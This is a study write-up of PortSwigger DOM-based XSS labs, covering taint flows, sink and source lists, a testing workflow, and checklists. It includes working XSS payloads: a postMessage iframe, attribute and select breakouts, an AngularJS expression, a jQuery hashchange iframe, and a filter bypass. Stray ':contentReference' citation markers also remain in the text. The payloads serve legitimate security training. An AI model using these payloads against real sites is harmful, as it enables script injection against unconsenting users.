# Lab 01 — DOM-Based XSS

## 1. Lab Overview

DOM-based Cross-Site Scripting (DOM XSS) occurs when client-side JavaScript takes attacker-controlled data from a source and passes it to a dangerous sink.

The important distinction is that the vulnerable behavior happens in the browser through JavaScript.

```text
Attacker-Controlled Input
        ↓
DOM Source
        ↓
JavaScript Processing
        ↓
DOM / JavaScript Sink
        ↓
Browser Interprets Data
        ↓
JavaScript Execution
```

The main mental model for these labs is:

```text
SOURCE → PROPAGATION → SINK → EXECUTION
```

---

# 2. Lab Environment

These labs are from:

```text
PortSwigger Web Security Academy
Category: DOM-Based XSS
```

Use:

```text
Burp Suite
Burp Browser
Chrome / supported browser
Developer Tools
DOM Invader
```

Only perform these exercises against the provided PortSwigger labs or systems where you have explicit authorization.

---

# 3. Lab 01 — DOM XSS Using Web Messages

## Objective

The lab demonstrates a simple Web Message vulnerability.

The objective is to use the exploit server to send a message to the target page and cause:

```javascript
print()
```

to execute.

---

## Vulnerability

The home page contains a Web Message event listener:

```javascript
window.addEventListener('message', function(event) {
    // process message
});
```

The incoming message is inserted into a page element.

Conceptually:

```text
Attacker-Controlled Page
        ↓
postMessage()
        ↓
event.data
        ↓
DOM Sink
        ↓
HTML Injection
        ↓
JavaScript Execution
```

---

## Exploit

Create an iframe on the exploit server:

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/"
onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
</iframe>
```

Replace:

```text
YOUR-LAB-ID
```

with the actual lab identifier.

---

## Explanation

The iframe loads the vulnerable page.

After loading:

```javascript
this.contentWindow.postMessage(...)
```

sends the malicious message to the target page.

The target page receives:

```html
<img src=1 onerror=print()>
```

The image source is intentionally invalid.

This causes:

```text
<img>
   ↓
Image Loading Error
   ↓
onerror
   ↓
print()
```

The source material describes this exact flow: the message is inserted into the `ads` element, and the invalid image triggers the `onerror` handler. :contentReference[oaicite:1]{index=1}

---

## Taint Flow

```text
postMessage()
      ↓
message event
      ↓
event.data
      ↓
ads element
      ↓
HTML Parsing
      ↓
<img src=1 onerror=print()>
      ↓
onerror
      ↓
print()
```

---

## Key Lesson

A Web Message can become a DOM XSS source when:

```text
Untrusted Message
        ↓
No Effective Origin Validation
        ↓
Dangerous DOM Sink
```

---

# 4. Lab 02 — DOM XSS Using Web Messages and a JavaScript URL

## Objective

This lab demonstrates a DOM-based redirection vulnerability triggered through Web Messages.

The objective is to construct an exploit that causes:

```javascript
print()
```

to execute.

---

## Vulnerable Behavior

The application:

```text
Receives Web Message
        ↓
Checks Message
        ↓
Uses location.href
```

The validation uses a flawed:

```javascript
indexOf()
```

check for:

```text
http:
https:
```

The source material states that the check searches for these strings anywhere within the message, while the sink is:

```javascript
location.href
```

:contentReference[oaicite:2]{index=2}

---

## Taint Flow

```text
Attacker Page
      ↓
postMessage()
      ↓
event.data
      ↓
indexOf("http:")
      ↓
location.href
      ↓
Browser Navigation
```

---

## Why the Validation Is Weak

The application checks whether:

```text
"http:"
```

or:

```text
"https:"
```

appears somewhere in the message.

This is not equivalent to safely validating the complete destination.

The security problem is:

```text
Substring Present
      ≠
Trusted URL
```

---

## Lab Concept

The exploit page sends a message containing:

```text
http:
```

together with a JavaScript URL.

The target accepts the message and assigns the supplied value to:

```javascript
location.href
```

The browser then processes the JavaScript URL.

---

## Key Lesson

When testing Web Message vulnerabilities:

```text
event.data
      ↓
Validation
      ↓
Sink
```

must always be analyzed.

Look for:

```text
indexOf()
includes()
startsWith()
endsWith()
```

and determine whether they actually validate the intended value.

---

# 5. Lab 03 — DOM XSS in `document.write()` Using `location.search`

## Objective

The lab contains a DOM XSS vulnerability in search functionality.

The vulnerable code uses:

```javascript
document.write()
```

with data derived from:

```javascript
location.search
```

The objective is to execute:

```javascript
alert()
```

---

## Vulnerability

The conceptual vulnerable code is:

```javascript
document.write(location.search);
```

The actual application performs additional processing, but the important relationship is:

```text
location.search
      ↓
document.write()
      ↓
HTML Interpretation
      ↓
XSS
```

The source material confirms that the search query is taken from `location.search` and passed to `document.write()`. :contentReference[oaicite:3]{index=3}

---

## Step 1 — Find the Search Functionality

Open the lab and locate:

```text
Search
```

Enter a harmless alphanumeric marker:

```text
carry123
```

---

## Step 2 — Locate the Marker

Use:

```text
DevTools → Elements
```

Find:

```text
carry123
```

Determine where the value appears.

In this lab, the value appears inside an:

```html
img
```

`src` attribute.

---

## Step 3 — Analyze the Context

The context is approximately:

```html
<img src="USER_INPUT">
```

Therefore, simply inserting arbitrary HTML without breaking out of the attribute may not work.

---

## Step 4 — Break Out of the Attribute

A suitable lab payload is:

```text
"><svg onload=alert(1)>
```

Conceptually:

```text
"
 ↓
Close Attribute
 ↓
>
 ↓
Close Tag
 ↓
<svg>
 ↓
onload
 ↓
alert(1)
```

---

## Taint Flow

```text
location.search
      ↓
Search Parameter
      ↓
document.write()
      ↓
<img src="USER_INPUT">
      ↓
Break Out of Attribute
      ↓
<svg onload=alert(1)>
      ↓
JavaScript Execution
```

The provided lab notes identify this exact approach. :contentReference[oaicite:4]{index=4}

---

# 6. Lab 04 — DOM XSS in `document.write()` Inside a `select`

## Objective

This lab uses:

```javascript
document.write()
```

with:

```javascript
location.search
```

The attacker-controlled value is placed inside a:

```html
<select>
```

element.

The objective is to break out of the `select` context and execute JavaScript.

---

## Vulnerable Flow

```text
location.search
      ↓
storeId
      ↓
document.write()
      ↓
<select>
      ↓
Attacker-Controlled HTML
```

The source material explains that the application extracts the `storeId` parameter and uses `document.write()` to create an option for the stock checker. :contentReference[oaicite:5]{index=5}

---

## Step 1 — Open a Product Page

Navigate to a product page.

Identify the:

```text
Stock Checker
```

functionality.

---

## Step 2 — Add `storeId`

Add a query parameter:

```text
storeId=test123
```

For example:

```text
/product?productId=1&storeId=test123
```

---

## Step 3 — Inspect the Result

The value:

```text
test123
```

should appear inside the stock-location dropdown.

Inspect the element.

You should find the value inside a:

```html
<select>
```

context.

---

## Step 4 — Break Out of the Context

The lab payload is:

```text
"><\/select><img src=1 onerror=alert(1)>
```

When represented in the URL, encode characters as required by the browser and application.

The source material provides the equivalent lab payload:

```text
"><\/select><img%20src=1%20onerror=alert(1)>
```

:contentReference[oaicite:6]{index=6}

---

## Taint Flow

```text
location.search
      ↓
storeId
      ↓
document.write()
      ↓
<select>
      ↓
"</select>
      ↓
<img>
      ↓
onerror
      ↓
alert(1)
```

---

## Key Lesson

DOM XSS payloads are highly dependent on context.

Always identify whether the input is inside:

```text
HTML text
Attribute
<select>
JavaScript
URL
```

before selecting a test technique.

---

# 7. Lab 05 — DOM XSS in `innerHTML` Using `location.search`

## Objective

This lab demonstrates DOM XSS through:

```javascript
innerHTML
```

The source is:

```javascript
location.search
```

---

## Vulnerable Code Pattern

Conceptually:

```javascript
let query =
    new URLSearchParams(location.search).get('search');

document.getElementById('searchMessage').innerHTML =
    "You searched for: " + query;
```

The source material identifies this exact source-to-sink relationship. :contentReference[oaicite:7]{index=7}

---

## Taint Flow

```text
URL
 ↓
location.search
 ↓
URLSearchParams.get()
 ↓
query
 ↓
innerHTML
 ↓
HTML Parsing
 ↓
Injected Element
 ↓
Event Handler
 ↓
JavaScript Execution
```

---

## Lab Payload

A suitable lab payload is:

```html
<img src=1 onerror=alert(1)>
```

The URL conceptually becomes:

```text
/search?search=<img src=1 onerror=alert(1)>
```

---

## Why the Payload Works

The browser receives:

```html
<img src=1 onerror=alert(1)>
```

`innerHTML` parses the string as HTML.

The browser creates:

```html
<img>
```

The image source:

```text
1
```

fails to load.

The failure triggers:

```text
onerror
```

which executes:

```javascript
alert(1)
```

The source material describes this complete flow. :contentReference[oaicite:8]{index=8}

---

# 8. Why `<script>` May Not Be the Best Test

A common mistake is immediately trying:

```html
<script>alert(1)</script>
```

DOM XSS depends on the exact sink and parsing behavior.

For:

```javascript
innerHTML
```

an injected element with an event handler can be more useful for demonstrating execution.

Always analyze:

```text
Context
Sink
Browser Parsing
```

rather than assuming one payload works everywhere.

---

# 9. Lab 06 — DOM XSS in jQuery Selector

## Objective

This lab demonstrates DOM XSS through jQuery's:

```javascript
$()
```

selector function.

The vulnerable source is:

```javascript
location.hash
```

---

## Vulnerable Pattern

The classic pattern is:

```javascript
$(window).on('hashchange', function() {
    var element = $(location.hash);
    element[0].scrollIntoView();
});
```

The hash is attacker-controlled.

The flow is:

```text
location.hash
      ↓
jQuery $()
      ↓
HTML / DOM Processing
      ↓
Potential XSS
```

The source material describes this classic jQuery selector vulnerability and notes that newer jQuery versions have patched some forms of it. :contentReference[oaicite:9]{index=9}

---

## Why `hashchange` Matters

The vulnerable code executes when:

```text
hashchange
```

fires.

An attacker therefore needs a way to cause the victim's browser to change the hash.

---

## iframe Delivery

A common lab technique is:

```html
<iframe src="https://vulnerable-website.com/#"
onload="this.src+='<img src=1 onerror=alert(1)>'">
</iframe>
```

The basic sequence is:

```text
iframe loads
      ↓
Hash changes
      ↓
hashchange fires
      ↓
jQuery $() receives attacker input
      ↓
DOM Processing
      ↓
XSS
```

The source material describes this iframe-based approach. :contentReference[oaicite:10]{index=10}

---

## Lab Objective

The PortSwigger lab asks you to deliver an exploit to the victim that causes:

```javascript
print()
```

to execute.

:contentReference[oaicite:11]{index=11}

---

# 10. Lab 07 — DOM XSS in AngularJS Expression

## Objective

This lab demonstrates DOM XSS through an AngularJS expression.

The important idea is that XSS may still be possible even when:

```text
<
>
"
```

are HTML-encoded.

---

## AngularJS Context

AngularJS processes expressions such as:

```text
{{ expression }}
```

when an element uses:

```html
ng-app
```

The source material notes that AngularJS evaluates expressions inside double curly braces. :contentReference[oaicite:12]{index=12}

---

## Step 1 — Identify AngularJS

Search the page HTML for:

```html
ng-app
```

Example:

```html
<body ng-app>
```

This indicates that AngularJS processing is active.

---

## Step 2 — Test Expression Evaluation

Submit:

```text
{{7*7}}
```

If the page evaluates the expression and displays:

```text
49
```

AngularJS expression evaluation is confirmed.

---

## Step 3 — Execute JavaScript

The lab notes use:

```text
{{$on.constructor('alert(1)')()}}
```

This demonstrates that JavaScript execution can be reached through the AngularJS expression context.

---

## Taint Flow

```text
Search Input
      ↓
AngularJS Template
      ↓
{{ expression }}
      ↓
AngularJS Expression Evaluation
      ↓
JavaScript Execution
```

---

## Key Lesson

When angle brackets are encoded:

```text
< → &lt;
> → &gt;
```

do not automatically conclude that XSS is impossible.

Identify the actual JavaScript framework and execution context.

---

# 11. Lab 08 — Stored DOM XSS

## Objective

Stored DOM XSS occurs when data is:

```text
Submitted
   ↓
Stored by the application
   ↓
Returned later
   ↓
Processed by client-side JavaScript
   ↓
Passed to a dangerous sink
```

The source material gives the conceptual pattern:

```javascript
element.innerHTML = comment.author
```

:contentReference[oaicite:13]{index=13}

---

## Lab Scenario

The lab uses:

```text
Blog Comments
```

The attacker submits a malicious comment.

The application stores the comment.

When another page is loaded, JavaScript processes the stored data through a dangerous DOM sink.

---

## Filter Bypass

The lab attempts to prevent XSS by using:

```javascript
replace()
```

to encode angle brackets.

However, when the first argument is a string, the replacement affects only the first occurrence.

The lab exploits this behavior by placing an additional pair of angle brackets before the actual HTML payload.

The source material gives:

```html
<><img src=1 onerror=alert(1)>
```

:contentReference[oaicite:14]{index=14}

---

## Taint Flow

```text
Comment Input
      ↓
Server Stores Comment
      ↓
Later Page Load
      ↓
Client-Side JavaScript
      ↓
element.innerHTML
      ↓
HTML Parsing
      ↓
<img>
      ↓
onerror
      ↓
alert(1)
```

---

# 12. DOM XSS Sink Reference

The main DOM-XSS sinks from the source material include:

```text
document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent
```

jQuery-related sinks include:

```text
add()
after()
append()
animate()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()
```

:contentReference[oaicite:15]{index=15}

---

# 13. DOM XSS Testing Workflow

Use the following workflow for every DOM-XSS lab.

```text
START
  ↓
Identify Input
  ↓
Identify Source
  ↓
Insert Unique Marker
  ↓
Find Marker in Live DOM
  ↓
Identify Context
  ↓
Find Sink
  ↓
Trace Data Flow
  ↓
Identify Encoding / Decoding
  ↓
Construct Context-Specific Test
  ↓
Confirm JavaScript Execution
  ↓
Document Source → Sink
```

---

# 14. Step 1 — Identify the Source

Search for:

```text
location.search
location.hash
location.pathname
document.URL
document.referrer
window.name
event.data
```

The source material lists these as common DOM-based sources. :contentReference[oaicite:16]{index=16}

---

# 15. Step 2 — Insert a Unique Marker

Use a harmless marker such as:

```text
domxsstest123
```

Examples:

```text
?search=domxsstest123
```

or:

```text
#domxsstest123
```

The objective is to track where the data travels.

---

# 16. Step 3 — Inspect the Live DOM

Use:

```text
DevTools
   ↓
Elements
```

Do not rely only on:

```text
View Source
```

DOM-based vulnerabilities often involve JavaScript changing the DOM after the initial HTML has loaded.

---

# 17. Step 4 — Identify the Context

Determine whether the marker appears inside:

```text
HTML text
HTML attribute
<select>
JavaScript
URL
DOM property
```

For example:

```html
<img src="domxsstest123">
```

means the input is inside an HTML attribute.

---

# 18. Step 5 — Find the Sink

Search JavaScript for:

```text
document.write
innerHTML
outerHTML
insertAdjacentHTML
eval
setTimeout
setInterval
Function
```

Also inspect:

```text
jQuery
location
WebSocket
postMessage
```

---

# 19. Step 6 — Trace the Data Flow

Example:

```text
location.search
      ↓
URLSearchParams
      ↓
query
      ↓
innerHTML
```

Do not stop after finding the source.

Do not stop after finding the sink.

The vulnerability is the connection between them.

---

# 20. Step 7 — Check Encoding

A payload may be transformed before reaching the sink.

Inspect:

```text
encodeURI()
decodeURI()
encodeURIComponent()
decodeURIComponent()
replace()
slice()
substring()
```

Determine the value immediately before the sink.

---

# 21. URL Encoding Gotcha

Modern browsers may encode parts of:

```text
location.search
location.hash
```

Therefore:

```text
Payload Entered
      ↓
Browser URL Processing
      ↓
JavaScript
```

may not produce the exact same value you entered.

The source material specifically notes URL-encoding behavior in Chrome, Firefox, and Safari. :contentReference[oaicite:17]{index=17}

---

# 22. Why View Source Can Mislead You

View Source shows the original HTML response.

DOM XSS may occur after:

```text
HTML Loads
      ↓
JavaScript Executes
      ↓
DOM Changes
      ↓
Injected Content Appears
```

Therefore, inspect:

```text
DevTools → Elements
```

for the live DOM.

---

# 23. DevTools Workflow

```text
1. Open target lab.
2. Open DevTools.
3. Go to Elements.
4. Find the input marker.
5. Identify the injection context.
6. Go to Sources.
7. Search all JavaScript.
8. Locate the source.
9. Locate the sink.
10. Set a breakpoint.
11. Trigger the source.
12. Inspect the runtime value.
13. Confirm the sink behavior.
```

---

# 24. DOM Invader Workflow

Burp's browser includes:

```text
DOM Invader
```

It can assist with:

```text
Source Identification
Taint Tracking
Sink Identification
```

The provided study material describes DOM Invader as a way to automate taint tracking and as especially useful for minified or obfuscated JavaScript. :contentReference[oaicite:18]{index=18}

Use it as an aid to manual analysis.

---

# 25. Burp Suite Workflow

```text
Burp Suite
    ↓
Open Burp Browser
    ↓
Load Lab
    ↓
HTTP History
    ↓
Inspect JavaScript
    ↓
Identify Sources
    ↓
Identify Sinks
    ↓
DOM Invader
    ↓
Confirm Taint Flow
    ↓
Build Lab Exploit
```

---

# 26. Source-to-Sink Examples

## Example A — `document.write()`

```text
location.search
      ↓
document.write()
      ↓
HTML Injection
      ↓
XSS
```

---

## Example B — `innerHTML`

```text
location.search
      ↓
URLSearchParams
      ↓
query
      ↓
innerHTML
      ↓
HTML Injection
      ↓
XSS
```

---

## Example C — Web Message

```text
postMessage()
      ↓
event.data
      ↓
DOM Sink
      ↓
XSS
```

---

## Example D — jQuery

```text
location.hash
      ↓
hashchange
      ↓
$()
      ↓
DOM Processing
      ↓
XSS
```

---

## Example E — AngularJS

```text
Search Input
      ↓
AngularJS Template
      ↓
{{ expression }}
      ↓
Expression Evaluation
      ↓
JavaScript Execution
```

---

# 27. Common Mistakes

## Mistake 1 — Using the Same Payload Everywhere

Different sinks require different testing approaches.

```text
innerHTML
      ≠
document.write()
      ≠
jQuery $()
      ≠
AngularJS
```

Always identify the context first.

---

## Mistake 2 — Testing Without a Marker

Start with:

```text
domxsstest123
```

rather than immediately using a complex payload.

---

## Mistake 3 — Looking Only at View Source

Use:

```text
DevTools → Elements
```

to inspect the live DOM.

---

## Mistake 4 — Ignoring JavaScript Transformations

Follow:

```text
Source
  ↓
Variable
  ↓
decode
  ↓
replace
  ↓
Sink
```

---

## Mistake 5 — Assuming a Sink Means XSS

Finding:

```javascript
innerHTML
```

does not automatically prove XSS.

You must prove that attacker-controlled data reaches it in an exploitable context.

---

## Mistake 6 — Ignoring Browser Behavior

Different browsers may process DOM APIs and legacy behaviors differently.

For lab-specific solutions, use the browser recommended by the lab when applicable.

---

# 28. Evidence to Record

For every lab, record:

```text
☐ Lab Name
☐ Vulnerability Type
☐ Source
☐ Sink
☐ Input Parameter
☐ Marker
☐ Injection Context
☐ Data Transformations
☐ Payload
☐ Browser Behavior
☐ JavaScript Execution
☐ Final Result
```

---

# 29. Lab Write-Up Template

Use this structure for future DOM-XSS labs:

```markdown
# Lab XX — [Lab Name]

## Objective

[What the lab asks you to achieve.]

## Vulnerability

[Explain the vulnerable behavior.]

## Source

```text
[Source]
```

## Sink

```text
[Sink]
```

## Taint Flow

```text
Source
  ↓
Processing
  ↓
Sink
  ↓
Execution
```

## Analysis

1. Identify functionality.
2. Insert marker.
3. Locate marker.
4. Identify context.
5. Find JavaScript source.
6. Find sink.
7. Trace data flow.
8. Construct context-specific test.

## Payload

```text
[Payload]
```

## Result

[Explain what happened.]

## Key Lesson

[What should be remembered.]
```

---

# 30. DOM XSS Master Checklist

```text
☐ Identify functionality
☐ Identify attacker-controlled input
☐ Identify source
☐ Insert unique marker
☐ Find marker in live DOM
☐ Identify context
☐ Search JavaScript
☐ Identify sink
☐ Trace source → sink
☐ Check encoding
☐ Check decoding
☐ Check filtering
☐ Check sanitization
☐ Determine browser behavior
☐ Construct context-specific test
☐ Confirm JavaScript execution
☐ Record evidence
☐ Document impact
```

---

# 31. Final Mental Model

```text
             ATTACKER INPUT
                   ↓
          ┌─────────────────┐
          │  DOM SOURCE     │
          │                 │
          │ location.hash   │
          │ location.search │
          │ event.data      │
          └────────┬────────┘
                   ↓
          ┌─────────────────┐
          │ JavaScript      │
          │ Processing      │
          └────────┬────────┘
                   ↓
          ┌─────────────────┐
          │ DOM / JS SINK   │
          │                 │
          │ innerHTML       │
          │ document.write  │
          │ $()             │
          │ eval()          │
          └────────┬────────┘
                   ↓
          ┌─────────────────┐
          │ Browser         │
          │ Interpretation  │
          └────────┬────────┘
                   ↓
          ┌─────────────────┐
          │ JavaScript      │
          │ Execution       │
          └─────────────────┘
```

---

# 32. Final Rule

```text
ATTACKER-CONTROLLED SOURCE
        +
DATA PROPAGATION
        +
DANGEROUS DOM / JS SINK
        +
UNSAFE CONTEXT
        +
REPRODUCIBLE JAVASCRIPT EXECUTION
        =
DOM-BASED XSS
```

---

# 33. Key PortSwigger Lessons

```text
1. Think in SOURCE → SINK terms.
2. Always trace the complete data flow.
3. Use unique markers before complex payloads.
4. Inspect the live DOM.
5. Identify the exact injection context.
6. Search JavaScript for sources and sinks.
7. Review encoding and decoding.
8. Web Messages can be DOM-XSS sources.
9. Weak origin validation can enable Web Message attacks.
10. jQuery selectors can become DOM-XSS sinks.
11. Frameworks such as AngularJS introduce additional execution contexts.
12. Stored data can later become a DOM-XSS source.
13. A sink alone does not prove a vulnerability.
14. Confirm the actual browser behavior.
```

---

# Lab Completion Status

```text
[ ] Lab 01 — DOM XSS using web messages
[ ] Lab 02 — DOM XSS using web messages + JavaScript URL
[ ] Lab 03 — DOM XSS using document.write + location.search
[ ] Lab 04 — DOM XSS using document.write inside select
[ ] Lab 05 — DOM XSS using innerHTML + location.search
[ ] Lab 06 — DOM XSS using jQuery selector + hashchange
[ ] Lab 07 — DOM XSS using AngularJS expression
[ ] Lab 08 — Stored DOM XSS
```

---

# Revision Summary

```text
SOURCE
↓
location.search
location.hash
event.data
stored data
↓
PROCESSING
↓
JavaScript
↓
SINK
↓
document.write()
innerHTML
$()
AngularJS expression
↓
BROWSER PARSES / EXECUTES
↓
XSS
```